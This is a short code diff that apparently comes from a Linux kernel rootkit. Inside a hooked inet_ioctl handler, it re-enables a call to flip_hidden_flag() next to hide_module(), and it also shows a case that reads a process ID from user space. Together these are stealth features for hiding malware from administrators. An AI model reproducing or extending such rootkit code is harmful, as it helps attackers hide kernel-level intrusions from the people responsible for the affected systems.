@@ -385,7 +385,7 @@ static int khook_inet_ioctl(struct socket * sock , unsigned int cmd ,unsigned lo
 		case 0:
 			hide_module();
 
-			// flip_hidden_flag();
+			flip_hidden_flag();
 			break;
 		case 1:
 			if (copy_from_user(&pid, args.argv, sizeof(unsigned int)))
